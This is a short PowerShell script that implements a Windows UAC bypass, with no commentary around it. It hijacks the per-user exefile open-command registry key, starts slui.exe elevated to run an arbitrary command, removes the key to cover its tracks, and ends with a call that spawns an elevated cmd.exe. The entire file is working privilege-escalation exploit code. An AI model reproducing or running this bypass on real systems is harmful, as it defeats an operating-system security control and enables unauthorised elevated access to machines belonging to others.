function SluiBypass(){
	Param (

		[Parameter(Mandatory=$True)]
		[String]$command,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)

	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force

	switch($arch)
	{
		64
		{
			Start-Process "C:\Windows\System32\slui.exe" -Verb runas
		}
		86
		{
			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
		}
	}

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
}


SluiBypass -command cmd.exe -arch 64
